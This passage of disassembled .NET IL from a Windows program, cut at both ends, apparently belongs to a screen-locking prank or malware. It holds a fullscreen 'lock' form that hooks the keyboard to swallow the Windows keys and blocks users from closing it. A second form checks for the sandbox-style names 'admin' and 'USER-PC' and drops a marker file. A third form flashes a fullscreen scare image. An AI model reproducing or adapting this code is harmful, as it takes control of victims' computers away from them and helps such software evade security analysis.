    IL_0062:  ldarg.0
    IL_0063:  ldstr      "Form1"
    IL_0068:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::set_Name(string)
    IL_006d:  ldarg.0
    IL_006e:  ldc.r8     0.5
    IL_0077:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_Opacity(float64)
    IL_007c:  ldarg.0
    IL_007d:  ldc.i4.0
    IL_007e:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ShowInTaskbar(bool)
    IL_0083:  ldarg.0
    IL_0084:  ldc.i4.1
    IL_0085:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_StartPosition(valuetype [System.Windows.Forms]System.Windows.Forms.FormStartPosition)
    IL_008a:  ldarg.0
    IL_008b:  ldstr      "lock"
    IL_0090:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Form::set_Text(string)
    IL_0095:  ldarg.0
    IL_0096:  ldc.i4.2
    IL_0097:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_WindowState(valuetype [System.Windows.Forms]System.Windows.Forms.FormWindowState)
    IL_009c:  ldarg.0
    IL_009d:  ldc.i4.0
    IL_009e:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::ResumeLayout(bool)
    IL_00a3:  ret
  } // end of method Form1::InitializeComponent

  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       28 (0x1c)
    .maxstack  8
    IL_0000:  ldnull
    IL_0001:  ldftn      native int Form1::HookCallback(int32,
                                                        native int,
                                                        native int)
    IL_0007:  newobj     instance void Form1/LowLevelKeyboardProc::.ctor(object,
                                                                         native int)
    IL_000c:  stsfld     class Form1/LowLevelKeyboardProc Form1::_proc
    IL_0011:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_0016:  stsfld     native int Form1::_hookID
    IL_001b:  ret
  } // end of method Form1::.cctor

  .method private instance void  Form1_FormClosed(object sender,
                                                  class [System.Windows.Forms]System.Windows.Forms.FormClosedEventArgs e) cil managed
  {
    // Code size       12 (0xc)
    .maxstack  8
    IL_0000:  ldsfld     native int Form1::_hookID
    IL_0005:  call       native int Form1::UnhookWindowsHookEx(native int)
    IL_000a:  pop
    IL_000b:  ret
  } // end of method Form1::Form1_FormClosed

  .method private instance void  Form1_FormClosing(object sender,
                                                   class [System.Windows.Forms]System.Windows.Forms.FormClosingEventArgs e) cil managed
  {
    // Code size       17 (0x11)
    .maxstack  8
    IL_0000:  ldarg.2
    IL_0001:  callvirt   instance valuetype [System.Windows.Forms]System.Windows.Forms.CloseReason [System.Windows.Forms]System.Windows.Forms.FormClosingEventArgs::get_CloseReason()
    IL_0006:  ldc.i4.3
    IL_0007:  bne.un.s   IL_0010

    IL_0009:  ldarg.2
    IL_000a:  ldc.i4.1
    IL_000b:  callvirt   instance void [System]System.ComponentModel.CancelEventArgs::set_Cancel(bool)
    IL_0010:  ret
  } // end of method Form1::Form1_FormClosing

  .method public static native int  HookCallback(int32 nCode,
                                                 native int wParam,
                                                 native int lParam) cil managed
  {
    // Code size       102 (0x66)
    .maxstack  4
    .locals init (valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_0,
             class [mscorlib]System.Exception V_1)
    IL_0000:  ldarg.0
    IL_0001:  ldc.i4.0
    IL_0002:  clt
    IL_0004:  ldc.i4.0
    IL_0005:  ceq
    IL_0007:  ldarg.1
    IL_0008:  ldc.i4     0x101
    IL_000d:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
    IL_0012:  call       bool [mscorlib]System.IntPtr::op_Equality(native int,
                                                                   native int)
    IL_0017:  and
    IL_0018:  brfalse.s  IL_0058

    IL_001a:  ldarg.2
    IL_001b:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::ReadInt32(native int)
    IL_0020:  stloc.0
    IL_0021:  ldloc.0
    IL_0022:  ldc.i4.s   91
    IL_0024:  ceq
    IL_0026:  ldloc.0
    IL_0027:  ldc.i4.s   92
    IL_0029:  ceq
    IL_002b:  or
    IL_002c:  brfalse.s  IL_0058

    .try
    {
      IL_002e:  ldc.i4     0xfb
      IL_0033:  ldc.i4.0
      IL_0034:  ldc.i4.1
      IL_0035:  conv.i8
      IL_0036:  ldc.i4.0
      IL_0037:  conv.i8
      IL_0038:  call       void Form1::keybd_event(uint8,
                                                   uint8,
                                                   int64,
                                                   int64)
      IL_003d:  leave.s    IL_0058

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003f:  dup
      IL_0040:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0045:  stloc.1
      IL_0046:  ldloc.1
      IL_0047:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0051:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0056:  leave.s    IL_0058

    }  // end handler
    IL_0058:  ldsfld     native int Form1::_hookID
    IL_005d:  ldarg.0
    IL_005e:  ldarg.1
    IL_005f:  ldarg.2
    IL_0060:  call       native int Form1::CallNextHookEx(native int,
                                                          int32,
                                                          native int,
                                                          native int)
    IL_0065:  ret
  } // end of method Form1::HookCallback

  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          native int  FindWindow(string lpClassName,
                                 string lpWindowName) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          bool  ShowWindow(native int hwnd,
                           int32 nCmdShow) cil managed preservesig
  {
  }
  .method family hidebysig specialname strict virtual 
          instance class [System.Windows.Forms]System.Windows.Forms.CreateParams 
          get_CreateParams() cil managed
  {
    // Code size       25 (0x19)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance class [System.Windows.Forms]System.Windows.Forms.CreateParams [System.Windows.Forms]System.Windows.Forms.Form::get_CreateParams()
    IL_0006:  dup
    IL_0007:  dup
    IL_0008:  callvirt   instance int32 [System.Windows.Forms]System.Windows.Forms.CreateParams::get_ClassStyle()
    IL_000d:  ldc.i4     0x200
    IL_0012:  or
    IL_0013:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.CreateParams::set_ClassStyle(int32)
    IL_0018:  ret
  } // end of method Form1::get_CreateParams

  .method private instance void  Form1_Load(object sender,
                                            class [mscorlib]System.EventArgs e) cil managed
  {
    // Code size       89 (0x59)
    .maxstack  2
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::BringToFront()
    IL_0006:  ldarg.0
    IL_0007:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Activate()
    IL_000c:  ldarg.0
    IL_000d:  call       instance bool [System.Windows.Forms]System.Windows.Forms.Control::Focus()
    IL_0012:  pop
    IL_0013:  ldsfld     class Form1/LowLevelKeyboardProc Form1::_proc
    IL_0018:  call       native int Form1::SetHook(class Form1/LowLevelKeyboardProc)
    IL_001d:  stsfld     native int Form1::_hookID
    IL_0022:  br.s       IL_003c

    IL_0024:  ldarg.0
    IL_0025:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Activate()
    IL_002a:  ldarg.0
    IL_002b:  call       instance bool [System.Windows.Forms]System.Windows.Forms.Control::Focus()
    IL_0030:  pop
    IL_0031:  ldarg.0
    IL_0032:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::BringToFront()
    IL_0037:  call       void [System.Windows.Forms]System.Windows.Forms.Application::DoEvents()
    IL_003c:  call       string [mscorlib]System.IO.Path::GetTempPath()
    IL_0041:  ldstr      "\\select.dat"
    IL_0046:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_004b:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_0050:  brtrue.s   IL_0024

    IL_0052:  ldarg.0
    IL_0053:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::Hide()
    IL_0058:  ret
  } // end of method Form1::Form1_Load

  .method public static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          native int  CallNextHookEx(native int hhk,
                                     int32 nCode,
                                     native int wParam,
                                     native int lParam) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          void  keybd_event(uint8 bVk,
                            uint8 bScan,
                            int64 dwFlags,
                            int64 dwExtraInfo) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("kernel32.dll" autochar lasterr winapi) 
          native int  GetModuleHandle(string& lpModuleName) cil managed preservesig
  {
  }
  .method private static native int  SetHook(class Form1/LowLevelKeyboardProc proc) cil managed
  {
    // Code size       33 (0x21)
    .maxstack  4
    .locals init (string V_0)
    IL_0000:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
    IL_0005:  callvirt   instance class [System]System.Diagnostics.ProcessModule [System]System.Diagnostics.Process::get_MainModule()
    IL_000a:  callvirt   instance string [System]System.Diagnostics.ProcessModule::get_ModuleName()
    IL_000f:  stloc.0
    IL_0010:  ldc.i4.s   13
    IL_0012:  ldarg.0
    IL_0013:  ldloca.s   V_0
    IL_0015:  call       native int Form1::GetModuleHandle(string&)
    IL_001a:  ldc.i4.0
    IL_001b:  call       native int Form1::SetWindowsHookEx(int32,
                                                            class Form1/LowLevelKeyboardProc,
                                                            native int,
                                                            uint32)
    IL_0020:  ret
  } // end of method Form1::SetHook

  .method public static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          native int  SetWindowsHookEx(int32 idHook,
                                       class Form1/LowLevelKeyboardProc lpfn,
                                       native int hMod,
                                       uint32 dwThreadId) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          native int  UnhookWindowsHookEx(native int hhk) cil managed preservesig
  {
  }
  .method private instance void  unfuck() cil managed
  {
    // Code size       1 (0x1)
    .maxstack  8
    IL_0000:  ret
  } // end of method Form1::unfuck

  .property instance class [System.Windows.Forms]System.Windows.Forms.CreateParams
          CreateParams()
  {
    .get instance class [System.Windows.Forms]System.Windows.Forms.CreateParams Form1::get_CreateParams()
  } // end of property Form1::CreateParams
} // end of class Form1

.class public auto ansi Form2
       extends [System.Windows.Forms]System.Windows.Forms.Form
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.DesignerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private class [System]System.ComponentModel.IContainer components
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       31 (0x1f)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldarg.0
    IL_0008:  ldftn      instance void Form2::Form2_Load(object,
                                                         class [mscorlib]System.EventArgs)
    IL_000e:  newobj     instance void [mscorlib]System.EventHandler::.ctor(object,
                                                                            native int)
    IL_0013:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::add_Load(class [mscorlib]System.EventHandler)
    IL_0018:  ldarg.0
    IL_0019:  call       instance void Form2::InitializeComponent()
    IL_001e:  ret
  } // end of method Form2::.ctor

  .method family hidebysig strict virtual 
          instance void  Dispose(bool disposing) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       33 (0x21)
    .maxstack  2
    .try
    {
      IL_0000:  ldarg.1
      IL_0001:  brfalse.s  IL_0016

      IL_0003:  ldarg.0
      IL_0004:  ldfld      class [System]System.ComponentModel.IContainer Form2::components
      IL_0009:  brfalse.s  IL_0016

      IL_000b:  ldarg.0
      IL_000c:  ldfld      class [System]System.ComponentModel.IContainer Form2::components
      IL_0011:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0016:  leave.s    IL_0020

    }  // end .try
    finally
    {
      IL_0018:  ldarg.0
      IL_0019:  ldarg.1
      IL_001a:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Dispose(bool)
      IL_001f:  endfinally
    }  // end handler
    IL_0020:  ret
  } // end of method Form2::Dispose

  .method private instance void  InitializeComponent() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       172 (0xac)
    .maxstack  3
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::SuspendLayout()
    IL_0006:  ldarg.0
    IL_0007:  ldc.r4     6.
    IL_000c:  ldc.r4     13.
    IL_0011:  newobj     instance void [System.Drawing]System.Drawing.SizeF::.ctor(float32,
                                                                                   float32)
    IL_0016:  call       instance void [System.Windows.Forms]System.Windows.Forms.ContainerControl::set_AutoScaleDimensions(valuetype [System.Drawing]System.Drawing.SizeF)
    IL_001b:  ldarg.0
    IL_001c:  ldc.i4.1
    IL_001d:  call       instance void [System.Windows.Forms]System.Windows.Forms.ContainerControl::set_AutoScaleMode(valuetype [System.Windows.Forms]System.Windows.Forms.AutoScaleMode)
    IL_0022:  ldarg.0
    IL_0023:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Fuchsia()
    IL_0028:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Form::set_BackColor(valuetype [System.Drawing]System.Drawing.Color)
    IL_002d:  ldarg.0
    IL_002e:  ldc.i4.s   70
    IL_0030:  ldc.i4.s   24
    IL_0032:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                  int32)
    IL_0037:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ClientSize(valuetype [System.Drawing]System.Drawing.Size)
    IL_003c:  ldarg.0
    IL_003d:  ldc.i4.0
    IL_003e:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ControlBox(bool)
    IL_0043:  ldarg.0
    IL_0044:  ldc.i4.0
    IL_0045:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_FormBorderStyle(valuetype [System.Windows.Forms]System.Windows.Forms.FormBorderStyle)
    IL_004a:  ldarg.0
    IL_004b:  ldc.i4.0
    IL_004c:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_MaximizeBox(bool)
    IL_0051:  ldarg.0
    IL_0052:  ldc.i4.0
    IL_0053:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_MinimizeBox(bool)
    IL_0058:  ldarg.0
    IL_0059:  ldstr      "Form2"
    IL_005e:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::set_Name(string)
    IL_0063:  ldarg.0
    IL_0064:  ldc.r8     0.0
    IL_006d:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_Opacity(float64)
    IL_0072:  ldarg.0
    IL_0073:  ldc.i4.0
    IL_0074:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ShowIcon(bool)
    IL_0079:  ldarg.0
    IL_007a:  ldc.i4.0
    IL_007b:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ShowInTaskbar(bool)
    IL_0080:  ldarg.0
    IL_0081:  ldc.i4.1
    IL_0082:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_StartPosition(valuetype [System.Windows.Forms]System.Windows.Forms.FormStartPosition)
    IL_0087:  ldarg.0
    IL_0088:  ldstr      "Form2"
    IL_008d:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Form::set_Text(string)
    IL_0092:  ldarg.0
    IL_0093:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Fuchsia()
    IL_0098:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_TransparencyKey(valuetype [System.Drawing]System.Drawing.Color)
    IL_009d:  ldarg.0
    IL_009e:  ldc.i4.1
    IL_009f:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_WindowState(valuetype [System.Windows.Forms]System.Windows.Forms.FormWindowState)
    IL_00a4:  ldarg.0
    IL_00a5:  ldc.i4.0
    IL_00a6:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::ResumeLayout(bool)
    IL_00ab:  ret
  } // end of method Form2::InitializeComponent

  .method private instance void  Form2_Load(object sender,
                                            class [mscorlib]System.EventArgs e) cil managed
  {
    // Code size       102 (0x66)
    .maxstack  4
    IL_0000:  call       string [mscorlib]System.Environment::get_UserName()
    IL_0005:  ldstr      "admin"
    IL_000a:  ldc.i4.0
    IL_000b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0010:  ldc.i4.0
    IL_0011:  ceq
    IL_0013:  call       string [System.Windows.Forms]System.Windows.Forms.SystemInformation::get_ComputerName()
    IL_0018:  ldstr      "USER-PC"
    IL_001d:  ldc.i4.0
    IL_001e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0023:  ldc.i4.0
    IL_0024:  ceq
    IL_0026:  and
    IL_0027:  brfalse.s  IL_005f

    IL_0029:  call       class My.MyComputer My.MyProject::get_Computer()
    IL_002e:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_0033:  call       string [mscorlib]System.IO.Path::GetTempPath()
    IL_0038:  ldstr      "sand.dat"
    IL_003d:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0042:  ldc.i4.1
    IL_0043:  callvirt   instance class [mscorlib]System.IO.StreamWriter [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::OpenTextFileWriter(string,
                                                                                                                                                                     bool)
    IL_0048:  dup
    IL_0049:  ldstr      "001"
    IL_004e:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
    IL_0053:  callvirt   instance void [mscorlib]System.IO.StreamWriter::Close()
    IL_0058:  ldarg.0
    IL_0059:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::Hide()
    IL_005e:  ret

    IL_005f:  ldarg.0
    IL_0060:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::Hide()
    IL_0065:  ret
  } // end of method Form2::Form2_Load

} // end of class Form2

.class public auto ansi frmSustos
       extends [System.Windows.Forms]System.Windows.Forms.Form
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.DesignerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private class [System]System.ComponentModel.IContainer components
  .field private class [System.Windows.Forms]System.Windows.Forms.PictureBox _PictureBox1
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.AccessedThroughPropertyAttribute::.ctor(string) = ( 01 00 0B 50 69 63 74 75 72 65 42 6F 78 31 00 00 ) // ...PictureBox1..
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       31 (0x1f)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldarg.0
    IL_0008:  ldftn      instance void frmSustos::frmSustos_Load(object,
                                                                 class [mscorlib]System.EventArgs)
    IL_000e:  newobj     instance void [mscorlib]System.EventHandler::.ctor(object,
                                                                            native int)
    IL_0013:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::add_Load(class [mscorlib]System.EventHandler)
    IL_0018:  ldarg.0
    IL_0019:  call       instance void frmSustos::InitializeComponent()
    IL_001e:  ret
  } // end of method frmSustos::.ctor

  .method family hidebysig strict virtual 
          instance void  Dispose(bool disposing) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       33 (0x21)
    .maxstack  2
    .try
    {
      IL_0000:  ldarg.1
      IL_0001:  brfalse.s  IL_0016

      IL_0003:  ldarg.0
      IL_0004:  ldfld      class [System]System.ComponentModel.IContainer frmSustos::components
      IL_0009:  brfalse.s  IL_0016

      IL_000b:  ldarg.0
      IL_000c:  ldfld      class [System]System.ComponentModel.IContainer frmSustos::components
      IL_0011:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0016:  leave.s    IL_0020

    }  // end .try
    finally
    {
      IL_0018:  ldarg.0
      IL_0019:  ldarg.1
      IL_001a:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Dispose(bool)
      IL_001f:  endfinally
    }  // end handler
    IL_0020:  ret
  } // end of method frmSustos::Dispose

  .method private instance void  InitializeComponent() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       268 (0x10c)
    .maxstack  3
    IL_0000:  ldarg.0
    IL_0001:  newobj     instance void [System.Windows.Forms]System.Windows.Forms.PictureBox::.ctor()
    IL_0006:  callvirt   instance void frmSustos::set_PictureBox1(class [System.Windows.Forms]System.Windows.Forms.PictureBox)
    IL_000b:  ldarg.0
    IL_000c:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_0011:  callvirt   instance void [System]System.ComponentModel.ISupportInitialize::BeginInit()
    IL_0016:  ldarg.0
    IL_0017:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::SuspendLayout()
    IL_001c:  ldarg.0
    IL_001d:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_0022:  ldc.i4.5
    IL_0023:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control::set_Dock(valuetype [System.Windows.Forms]System.Windows.Forms.DockStyle)
    IL_0028:  ldarg.0
    IL_0029:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_002e:  ldc.i4.0
    IL_002f:  ldc.i4.0
    IL_0030:  newobj     instance void [System.Drawing]System.Drawing.Point::.ctor(int32,
                                                                                   int32)
    IL_0035:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control::set_Location(valuetype [System.Drawing]System.Drawing.Point)
    IL_003a:  ldarg.0
    IL_003b:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_0040:  ldstr      "PictureBox1"
    IL_0045:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control::set_Name(string)
    IL_004a:  ldarg.0
    IL_004b:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_0050:  ldc.i4     0x3f1
    IL_0055:  ldc.i4     0x27e
    IL_005a:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                  int32)
    IL_005f:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control::set_Size(valuetype [System.Drawing]System.Drawing.Size)
    IL_0064:  ldarg.0
    IL_0065:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_006a:  ldc.i4.1
    IL_006b:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.PictureBox::set_SizeMode(valuetype [System.Windows.Forms]System.Windows.Forms.PictureBoxSizeMode)
    IL_0070:  ldarg.0
    IL_0071:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_0076:  ldc.i4.0
    IL_0077:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.PictureBox::set_TabIndex(int32)
    IL_007c:  ldarg.0
    IL_007d:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_0082:  ldc.i4.0
    IL_0083:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.PictureBox::set_TabStop(bool)
    IL_0088:  ldarg.0
    IL_0089:  ldc.r4     6.
    IL_008e:  ldc.r4     13.
    IL_0093:  newobj     instance void [System.Drawing]System.Drawing.SizeF::.ctor(float32,
                                                                                   float32)
    IL_0098:  call       instance void [System.Windows.Forms]System.Windows.Forms.ContainerControl::set_AutoScaleDimensions(valuetype [System.Drawing]System.Drawing.SizeF)
    IL_009d:  ldarg.0
    IL_009e:  ldc.i4.1
    IL_009f:  call       instance void [System.Windows.Forms]System.Windows.Forms.ContainerControl::set_AutoScaleMode(valuetype [System.Windows.Forms]System.Windows.Forms.AutoScaleMode)
    IL_00a4:  ldarg.0
    IL_00a5:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Black()
    IL_00aa:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Form::set_BackColor(valuetype [System.Drawing]System.Drawing.Color)
    IL_00af:  ldarg.0
    IL_00b0:  ldc.i4     0x3f1
    IL_00b5:  ldc.i4     0x27e
    IL_00ba:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                  int32)
    IL_00bf:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ClientSize(valuetype [System.Drawing]System.Drawing.Size)
    IL_00c4:  ldarg.0
    IL_00c5:  call       instance class [System.Windows.Forms]System.Windows.Forms.Control/ControlCollection [System.Windows.Forms]System.Windows.Forms.Control::get_Controls()
    IL_00ca:  ldarg.0
    IL_00cb:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_00d0:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control/ControlCollection::Add(class [System.Windows.Forms]System.Windows.Forms.Control)
    IL_00d5:  ldarg.0
    IL_00d6:  ldc.i4.0
    IL_00d7:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_FormBorderStyle(valuetype [System.Windows.Forms]System.Windows.Forms.FormBorderStyle)
    IL_00dc:  ldarg.0
    IL_00dd:  ldstr      "frmSustos"
    IL_00e2:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::set_Name(string)
    IL_00e7:  ldarg.0
    IL_00e8:  ldstr      "frmSustos"
    IL_00ed:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Form::set_Text(string)
    IL_00f2:  ldarg.0
    IL_00f3:  ldc.i4.2
    IL_00f4:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_WindowState(valuetype [System.Windows.Forms]System.Windows.Forms.FormWindowState)
    IL_00f9:  ldarg.0
    IL_00fa:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_00ff:  callvirt   instance void [System]System.ComponentModel.ISupportInitialize::EndInit()
    IL_0104:  ldarg.0
    IL_0105:  ldc.i4.0
    IL_0106:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::ResumeLayout(bool)
    IL_010b:  ret
  } // end of method frmSustos::InitializeComponent

  .method assembly newslot specialname strict virtual 
          instance class [System.Windows.Forms]System.Windows.Forms.PictureBox 
          get_PictureBox1() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::_PictureBox1
    IL_0006:  ret
  } // end of method frmSustos::get_PictureBox1

  .method assembly newslot specialname strict virtual 
          instance void  set_PictureBox1(class [System.Windows.Forms]System.Windows.Forms.PictureBox WithEventsValue) cil managed synchronized
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::_PictureBox1
    IL_0007:  ret
  } // end of method frmSustos::set_PictureBox1

  .method private instance void  frmSustos_Load(object sender,
                                                class [mscorlib]System.EventArgs e) cil managed
  {
    // Code size       69 (0x45)
    .maxstack  2
    .locals init (class [System]System.Diagnostics.Stopwatch V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      .try
      {
        IL_0000:  newobj     instance void [System]System.Diagnostics.Stopwatch::.ctor()
        IL_0005:  stloc.0
        IL_0006:  ldloc.0
        IL_0007:  callvirt   instance void [System]System.Diagnostics.Stopwatch::Start()
        IL_000c:  br.s       IL_0013

        IL_000e:  call       void [System.Windows.Forms]System.Windows.Forms.Application::DoEvents()
        IL_0013:  ldloc.0
        IL_0014:  callvirt   instance int64 [System]System.Diagnostics.Stopwatch::get_ElapsedMilliseconds()
        IL_0019:  ldc.i4     0xbb8
        IL_001e:  conv.i8
        IL_001f:  blt.s      IL_000e

        IL_0021:  ldloc.0
        IL_0022:  callvirt   instance void [System]System.Diagnostics.Stopwatch::Stop()
        IL_0027:  ldarg.0
        IL_0028:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Close()
        IL_002d:  leave.s    IL_0044

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_002f:  dup
        IL_0030:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0035:  stloc.1
        IL_0036:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_003b:  leave.s    IL_0044

      }  // end handler
    }  // end .try
    finally
    {
      IL_003d:  ldarg.0
